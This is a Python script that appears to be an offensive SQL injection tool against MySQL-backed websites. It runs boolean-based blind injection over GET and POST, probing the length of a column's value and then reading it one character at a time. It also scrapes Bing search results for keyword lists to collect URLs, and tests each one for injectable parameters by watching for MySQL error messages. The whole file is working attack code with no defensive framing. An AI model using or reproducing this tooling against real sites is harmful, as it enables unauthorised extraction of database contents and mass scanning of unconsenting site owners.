import os
import requests
import argparse
import keyboard
import sys
from treelib import Node, Tree
from string import ascii_lowercase
from string import digits
from string import punctuation
from bs4 import BeautifulSoup
from colorama import Fore, init
import colorama
colorama.init()

class Mysql:
	def __init__(self, url, column_name, length, sign, data, endpoint, filekeyword, pages, fileurl, clear):
		self.url = url
		self.column_name = column_name
		self.length = length
		self.sign = sign
		self.data = data
		self.endpoint = endpoint
		self.filekeyword = filekeyword
		self.pages = pages
		self.fileurl = fileurl
		self.clear = clear

	def clear_term(self):
		os.system(f"{self.clear}")

	def info(self):
		tree = Tree()
		tree.create_node(f"{Fore.YELLOW}Target" + f"{Fore.RESET}", "target")
		tree.create_node(f"{Fore.YELLOW}Url" + f"{Fore.RESET}", "url", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.url}" + f"{Fore.RESET}", parent="url")
		tree.create_node(f"{Fore.YELLOW}Column" + f"{Fore.RESET}", "column", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.column_name}" + f"{Fore.RESET}", parent="column")
		tree.create_node(f"{Fore.YELLOW}Length" + f"{Fore.RESET}", "length", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.column_name}" + f"{Fore.RESET}", parent="length")
		tree.create_node(f"{Fore.YELLOW}Sign" + f"{Fore.RESET}", "sign", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.sign}" + f"{Fore.RESET}", parent="sign")
		tree.create_node(f"{Fore.YELLOW}Data" + f"{Fore.RESET}", "data", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.data}" + f"{Fore.RESET}", parent="data")
		tree.create_node(f"{Fore.YELLOW}Endpoint" + f"{Fore.RESET}", "endpoint", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.endpoint}" + f"{Fore.RESET}", parent="endpoint")
		tree.show()

	def length_row_get(self):
		print(f"{Fore.WHITE}[{Fore.YELLOW}Length{Fore.WHITE}]: ", end='', flush=True)
		for i in range(0, 100):
			target = requests.get(self.url + f"{self.endpoint} and (select length({self.column_name})=" + str(i) + ")#")
			if self.sign in target.text:
				print(f"{Fore.GREEN}{i}")
				if keyboard.read_key() == "enter":
					break
		
	def length_row_post(self):
		print(f"{Fore.WHITE}[{Fore.YELLOW}Length{Fore.WHITE}]: ", end='', flush=True)
		for i in range(0, 100):
			target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select length({self.column_name})=" + str(i) + ")#"})
			if self.sign in target.text:
				print(f"{Fore.GREEN}{i}")
				print(f"{Fore.GREEN}\nPress enter to exit")
				if keyboard.read_key() == "enter":
					break
		           

	def substr_row_get(self):
		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
		for a in range(0, int(self.length)):
			for b in charset:
				target = requests.get(self.url + f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#")
				if self.sign in target.text:
					print(f"{Fore.GREEN}{b}", end='', flush=True)
					if keyboard.read_key() == "enter":
						break

	def substr_row_post(self):
		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
		for a in range(0, int(self.length)):
			for b in charset:
				target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#"})
				if self.sign in target.text:
					print(f"{Fore.GREEN}{b}", end='', flush=True)
					if keyboard.read_key() == "enter":
						break

	def sqlinjectable(self):
		errors = ["Warning: mysql_", "You have an error in your SQL syntax;", "function.mysql", "MySQL result index"]
		with open(self.fileurl, "r") as file:
			file = file.readlines()
			file = [i.strip() for i in file]
			for i in file:
				r = requests.get(i + "%27", headers={"User-agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"})
				for error in errors:
					if error in r.text:
						print(f"{Fore.WHITE}[{Fore.YELLOW}Vulnerable{Fore.WHITE}]: {i}")
						with open("linksvulnerables.txt", "a+") as file:
							file.write(i + "\n")

	def urlfilter(self):
	    with open(self.filekeyword, "r") as file:
	        content = file.readlines()
	    content = [a.strip() for a in content] 
	    results = []
	    for a in content:
	        for i in range(0, int(self.pages)):
	            a = requests.get(f"https://www.bing.com/search?q={a}&first={self.pages}1", headers={"User-agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"})
	            soup = BeautifulSoup(a.content, 'html.parser')
	            items = soup.select('a[href^="http"]')
	            for item in items:
	                results.append(item['href'])
	    filter_x = []
	    for i in results:
	        if "google" not in i:
	            if "microsoft" not in i:
	                if "bing" not in i:
	                    filter_x.append(i)
	    duplicate_rm = []
	    for n, i in enumerate(filter_x):
	        if i not in filter_x[:n]:
	            duplicate_rm.append(i)
	    with open("linksparams.txt", "a+") as file:
	        for i in duplicate_rm:
	            file.write(i + "\n")
	    print(f"{Fore.WHITE}[{Fore.YELLOW}Saved{Fore.WHITE}]: {Fore.GREEN}linksparams.txt{Fore.RESET}")
	    with open("linksparams.txt", "r") as file:
	        a = file.readlines()
	        with open("linkscleaned.txt", "a+") as file:
	            for a in a:
	                file.write(str(a).split("/")[2] + "\n")
	    print(f"{Fore.WHITE}[{Fore.YELLOW}Saved{Fore.WHITE}]: {Fore.GREEN}linkscleaned.txt{Fore.RESET}")

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-lrg', '--length_row_get', dest='length_row_get', action='store_true', help="usage: python3 main.py -lrg --url [https://example.com/a.php?id=1] --endpoint ['] --column [name] --sign [keyword]")
	parser.add_argument('-lrp', '--length_row_post', dest='length_row_post', action='store_true', help="usage: python3 main.py -lrp --url [https://example.com/a.php?id=1] --endpoint ['] --data [Data] --column [name] --sign [keyword]")
	parser.add_argument('-srg', '--substr_row_get', dest='substr_row_get', action='store_true', help="usage: python3 main.py -srg --url [https://example.com/a.php?id=1] --endpoint ['] --column [name] --length [int] --sign [keyword]")
	parser.add_argument('-srp', '--substr_row_post', dest='substr_row_post', action='store_true', help="usage: python3 main.py -srp --url [https://example.com/a.php] --endpoint ['] --data [Data] --column [name] --length [int] --sign [keyword]")
	parser.add_argument('-uf', '--urlfilter', dest='urlfilter', action='store_true', help="usage: python3 main.py -uf --filekeyword [file] --pages [number]")
	parser.add_argument('-si', '--sqlinjectable', dest='sqlinjectable', action='store_true', help="usage: python3 main.py -si --filelinks [file]")
	parser.add_argument('-url', '--url', dest='url')
	parser.add_argument('-data', '--data', dest='data')
	parser.add_argument('-endpoint', '--endpoint', dest='endpoint')
	parser.add_argument('-column', '--column', dest='column')
	parser.add_argument('-length', '--length', dest='length')
	parser.add_argument('-sign', '--sign', dest='sign')
	parser.add_argument('-filekeyword', '--filekeyword', dest='filekeyword')
	parser.add_argument('-filelinks', '--filelinks', dest='filelinks')
	parser.add_argument('-pages', '--pages', dest='pages')
	args = parser.parse_args()

	if args.length_row_get:
		if args.endpoint is None:
			args.endpoint = "+"
			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
			length_row_get = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
			info = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
			clear.clear_term()
			info.info()
			length_row_get.length_row_get()

	if args.length_row_post:
		if args.endpoint is None:
			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
			args.endpoint = "+"
			length_row_post = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
			info = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
			clear.clear_term()
			info.info()
			length_row_post.length_row_post()

	if args.substr_row_get:
		if args.endpoint is None:
			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
			args.endpoint = "+"
			substr_row_get = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint,False, False, False, False)
			info = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint, False, False, False, False)
			clear.clear_term()
			info.info()
			substr_row_get.substr_row_get()

	if args.substr_row_post:
		if args.endpoint is None:
			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
			args.endpoint = "+"
			substr_row_post = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
			info = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
			clear.clear_term()
			info.info()
			substr_row_post.substr_row_post()

	if args.urlfilter:
		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
		urlfilter = Mysql(False, False, False, False, False, False, args.filekeyword, args.pages, False, False)
		clear.clear_term()
		urlfilter.urlfilter()

	if args.sqlinjectable:
		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
		sqlinjectable = Mysql(False, False, False, False, False, False, False, False, args.filelinks, False)
		clear.clear_term()
		sqlinjectable.sqlinjectable()

	print(f"{Fore.RED}To show commands set -h or --help as argument{Fore.RESET}")

main()
